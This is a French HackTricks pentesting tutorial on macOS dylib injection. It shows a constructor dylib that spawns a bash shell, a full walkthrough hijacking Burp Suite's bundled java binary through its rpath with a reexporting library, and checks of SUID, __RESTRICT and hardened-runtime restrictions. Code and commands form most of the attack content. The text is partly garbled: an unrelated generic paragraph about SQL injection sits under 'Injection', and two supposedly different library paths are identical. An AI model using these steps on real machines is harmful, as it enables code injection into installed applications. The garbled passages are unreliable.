# macOS Dyld Hijacking & DYLD\_INSERT\_LIBRARIES

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Exemple de base DYLD\_INSERT\_LIBRARIES

**Bibliothèque à injecter** pour exécuter un shell :
```c
// gcc -dynamiclib -o inject.dylib inject.c

#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
__attribute__((constructor))

void myconstructor(int argc, const char **argv)
{
    syslog(LOG_ERR, "[+] dylib injected in %s\n", argv[0]);
    printf("[+] dylib injected in %s\n", argv[0]);
    execv("/bin/bash", 0);
}
```
Binaire à attaquer:
```c
// gcc hello.c -o hello
#include <stdio.h>

int main()
{
    printf("Hello, World!\n");
    return 0;
}
```
Injection :

L'injection est une technique courante utilisée par les attaquants pour exploiter les vulnérabilités des applications. Elle consiste à insérer du code malveillant dans une application afin de prendre le contrôle de celle-ci ou d'obtenir des informations sensibles. Les injections peuvent se produire dans différents types d'applications, y compris les applications de bureau, les applications Web et les applications mobiles. Les injections les plus courantes sont les injections SQL et les injections de commandes. Les injections peuvent être évitées en utilisant des techniques de codage sécurisé et en validant les entrées utilisateur.
```bash
DYLD_INSERT_LIBRARIES=inject.dylib ./hello
```
## Exemple de Dyld Hijacking

Le binaire vulnérable ciblé est `/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java`.

{% tabs %}
{% tab title="LC_RPATH" %}
{% code overflow="wrap" %}
```bash
# Check where are the @rpath locations
otool -l "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java" | grep LC_RPATH -A 2
          cmd LC_RPATH
      cmdsize 32
         path @loader_path/. (offset 12)
--
          cmd LC_RPATH
      cmdsize 32
         path @loader_path/../lib (offset 12)
```
{% endcode %}
{% endtab %}

{% tab title="@executable_path" %}
{% code overflow="wrap" %}
```bash
# Check librareis loaded using @rapth and the used versions
otool -l "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java" | grep "@rpath" -A 3
         name @rpath/libjli.dylib (offset 24)
   time stamp 2 Thu Jan  1 01:00:02 1970
      current version 1.0.0
compatibility version 1.0.0
```
{% endcode %}
{% endtab %}

{% tab title="entitlements" %}
<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">codesign -dv --entitlements :- "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java"
<strong>[...]com.apple.security.cs.disable-library-validation[...]
</strong></code></pre>
{% endtab %}
{% endtabs %}

Avec les informations précédentes, nous savons qu'il **ne vérifie pas la signature des bibliothèques chargées** et qu'il **essaie de charger une bibliothèque depuis**:

* `/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/libjli.dylib`
* `/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/libjli.dylib`

Cependant, le premier n'existe pas:
```bash
pwd
/Applications/Burp Suite Professional.app

find ./ -name libjli.dylib
./Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib
./Contents/Resources/jre.bundle/Contents/MacOS/libjli.dylib
```
Il est donc possible de le pirater ! Créez une bibliothèque qui exécute un code arbitraire et exporte les mêmes fonctionnalités que la bibliothèque légitime en la réexportant. Et n'oubliez pas de la compiler avec les versions attendues :

{% code title="libjli.m" %}
```objectivec
#import <Foundation/Foundation.h>

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"[+] dylib hijacked in %s",argv[0]);
}
```
{% endcode %}

Compilez-le :

{% code overflow="wrap" %}
```bash
gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation libjli.m -Wl,-reexport_library,"/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib" -o libjli.dylib
# Note the versions and the reexport
```
{% endcode %}

Le chemin de réexportation créé dans la bibliothèque est relatif au chargeur, changeons-le pour un chemin absolu vers la bibliothèque à exporter :

{% code overflow="wrap" %}
```bash
#Check relative
otool -l libjli.dylib| grep REEXPORT -A 2
         cmd LC_REEXPORT_DYLIB
         cmdsize 48
         name @rpath/libjli.dylib (offset 24)

#Change to absolute to the location of the library
install_name_tool -change @rpath/libjli.dylib "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib" libjli.dylib

# Check again
otool -l libjli.dylib| grep REEXPORT -A 2
          cmd LC_REEXPORT_DYLIB
      cmdsize 128
         name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
```
{% endcode %}

Finalement, copiez-le simplement dans l'**emplacement détourné** : 

{% code overflow="wrap" %}
```bash
cp libjli.dylib "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/libjli.dylib"
```
{% endcode %}

Et **exécutez** le binaire et vérifiez que la **bibliothèque a été chargée** :

<pre class="language-context"><code class="lang-context">./java
<strong>2023-05-15 15:20:36.677 java[78809:21797902] [+] dylib hijacked in ./java
</strong>Usage: java [options] &#x3C;mainclass> [args...]
           (to execute a class)
</code></pre>

{% hint style="info" %}
Un bon article sur la façon d'exploiter cette vulnérabilité pour abuser des autorisations de caméra de Telegram peut être trouvé sur [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
{% endhint %}

## Plus grande échelle

Si vous prévoyez d'essayer d'injecter des bibliothèques dans des binaires inattendus, vous pouvez vérifier les messages d'événement pour savoir quand la bibliothèque est chargée à l'intérieur d'un processus (dans ce cas, supprimez le printf et l'exécution de `/bin/bash`).
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
```
## Vérifier les restrictions

### SUID & SGID
```bash
# Make it owned by root and suid
sudo chown root hello
sudo chmod +s hello
# Insert the library
DYLD_INSERT_LIBRARIES=inject.dylib ./hello

# Remove suid
sudo chmod -s hello
```
### Section `__RESTRICT` avec le segment `__restrict`
```bash
gcc -sectcreate __RESTRICT __restrict /dev/null hello.c -o hello-restrict
DYLD_INSERT_LIBRARIES=inject.dylib ./hello-restrict
```
### Runtime sécurisé

Créez un nouveau certificat dans le trousseau de clés et utilisez-le pour signer le binaire :

{% code overflow="wrap" %}
```bash
codesign -s <cert-name> --option=runtime ./hello
DYLD_INSERT_LIBRARIES=inject.dylib ./hello

codesign -f -s <cert-name> --option=library ./hello
DYLD_INSERT_LIBRARIES=example.dylib ./hello-signed #Will throw an error because signature of binary and library aren't signed by same cert

codesign -s <cert-name> inject.dylib
DYLD_INSERT_LIBRARIES=example.dylib ./hello-signed #Throw an error because an Apple dev certificate is needed
```
{% endcode %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live).
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
